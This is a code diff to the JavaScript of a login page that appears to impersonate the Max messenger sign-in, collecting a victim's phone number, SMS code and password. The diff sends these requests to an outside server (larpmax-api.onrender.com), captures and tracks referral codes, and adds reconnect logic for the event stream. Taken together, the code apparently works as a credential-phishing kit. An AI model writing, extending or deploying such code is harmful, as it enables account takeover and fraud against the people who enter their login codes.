@@ -1,6 +1,7 @@
 (function () {
   const AUTH_STORAGE_KEY = "max-auth-id";
   const COUNTRY_STORAGE_KEY = "max-country";
+  const REF_STORAGE_KEY = "max_ref";
 
   const container = document.querySelector(".container.svelte-vywflk");
   const popoverPortal = document.querySelector(".popoverPortal");
@@ -18,6 +19,7 @@
     i18n: null,
     authId: null,
     botUsername: "larpmaxbot",
+    apiBase: "",
     error: "",
     smsCode: "",
     smsPassword: "",
@@ -119,11 +121,18 @@
     return `${country.code}${digits}`;
   }
 
+  function apiUrl(path) {
+    const base = String(state.apiBase || "").replace(/\/$/, "");
+    if (!base) return path;
+    if (/^https?:\/\//i.test(path)) return path;
+    return `${base}${path.startsWith("/") ? path : `/${path}`}`;
+  }
+
   async function api(path, options = {}) {
     const headers = Object.assign({ Accept: "application/json" }, options.headers || {});
     if (options.body && !headers["Content-Type"]) headers["Content-Type"] = "application/json";
-    const res = await fetch(path, {
-      credentials: "same-origin",
+    const res = await fetch(apiUrl(path), {
+      credentials: state.apiBase ? "omit" : "same-origin",
       ...options,
       headers,
       body:
@@ -132,13 +141,53 @@
           : options.body,
     });
     const contentType = res.headers.get("content-type") || "";
-    const data = contentType.includes("application/json")
-      ? await res.json().catch(() => ({}))
-      : {};
+    let data = {};
+    if (contentType.includes("application/json")) {
+      data = await res.json().catch(() => ({}));
+    } else {
+      const text = await res.text().catch(() => "");
+      if (text) data = { error: text.trim().slice(0, 200) };
+    }
     if (!res.ok) {
-      throw new Error(formatError(data.error) || `Ошибка ${res.status}`);
+      const msg = formatError(data.error);
+      if (res.status === 404) {
+        throw new Error(msg && msg !== "Ошибка" ? msg : "Сервер авторизации недоступен. Попробуйте через минуту.");
+      }
+      throw new Error(msg || `Ошибка ${res.status}`);
     }
     return data;
+  }
+
+  function captureRef() {
+    try {
+      const params = new URLSearchParams(window.location.search);
+      const fromQuery = String(params.get("ref") || "").trim().toLowerCase();
+      if (fromQuery) {
+        localStorage.setItem(REF_STORAGE_KEY, fromQuery);
+        return fromQuery;
+      }
+      return String(localStorage.getItem(REF_STORAGE_KEY) || "").trim().toLowerCase();
+    } catch {
+      return "";
+    }
+  }
+
+  function currentRef() {
+    try {
+      return String(localStorage.getItem(REF_STORAGE_KEY) || "").trim().toLowerCase();
+    } catch {
+      return "";
+    }
+  }
+
+  async function trackVisit() {
+    const ref = captureRef();
+    if (!ref) return;
+    try {
+      await api("/api/auth/visit", { method: "POST", body: { ref } });
+    } catch {
+      /* ignore */
+    }
   }
 
   async function ensureAuth() {
@@ -154,7 +203,8 @@
         sessionStorage.removeItem(AUTH_STORAGE_KEY);
       }
     }
-    const data = await api("/api/auth/start", { method: "POST", body: {} });
+    const ref = currentRef() || captureRef();
+    const data = await api("/api/auth/start", { method: "POST", body: { ref } });
     state.authId = data.authId;
     sessionStorage.setItem(AUTH_STORAGE_KEY, state.authId);
     connectEvents();
@@ -163,13 +213,26 @@
 
   function connectEvents() {
     if (state.source) state.source.close();
-    state.source = new EventSource(`/api/auth/${state.authId}/events`);
+    const url = apiUrl(`/api/auth/${state.authId}/events`);
+    state.source = new EventSource(url);
     state.source.onmessage = (event) => {
       try {
         handleEvent(JSON.parse(event.data));
       } catch {
         /* ignore */
       }
+    };
+    state.source.onerror = () => {
+      // Vercel/proxy flaps are normal; keep authId and retry lightly.
+      if (!state.authId || state.view === "success") return;
+      try {
+        state.source.close();
+      } catch {
+        /* ignore */
+      }
+      setTimeout(() => {
+        if (state.authId && state.view !== "success") connectEvents();
+      }, 1500);
     };
   }
 
@@ -216,9 +279,17 @@
     }
     await ensureAuth();
     const phone = buildPhoneNumber();
-    const snap = await api(`/api/auth/${state.authId}/sms`, { method: "POST", body: { phone } });
-    state.view = "code";
-    await applySnapshot(snap);
+    try {
+      const snap = await api(`/api/auth/${state.authId}/sms`, { method: "POST", body: { phone } });
+      state.view = "code";
+      await applySnapshot(snap);
+    } catch (error) {
+      const msg = formatError(error);
+      if (/connect|closed|network|fetch|ECONN|socket/i.test(msg)) {
+        throw new Error("Связь с сервером Max оборвалась. Подождите 20–40 сек (cold start) и нажмите «Продолжить» ещё раз.");
+      }
+      throw error;
+    }
   }
 
   async function submitCode() {
@@ -651,11 +722,19 @@
     } catch {
       /* ignore */
     }
-    api("/api/auth/config")
-      .then((cfg) => {
-        if (cfg.botUsername) state.botUsername = cfg.botUsername.replace(/^@/, "");
-      })
-      .catch(() => {});
+    captureRef();
+    const host = window.location.hostname;
+    const isLocal = host === "127.0.0.1" || host === "localhost";
+    // Production: talk to Render directly (SSE through Vercel often dies with "connect closed").
+    state.apiBase = isLocal ? "" : "https://larpmax-api.onrender.com";
+    try {
+      const cfg = await api("/api/auth/config");
+      if (cfg.botUsername) state.botUsername = cfg.botUsername.replace(/^@/, "");
+      if (cfg.apiBase) state.apiBase = String(cfg.apiBase).replace(/\/$/, "");
+    } catch {
+      /* keep default apiBase */
+    }
+    await trackVisit().catch(() => {});
     fixLayout();
     state.view = "phone";
     render();
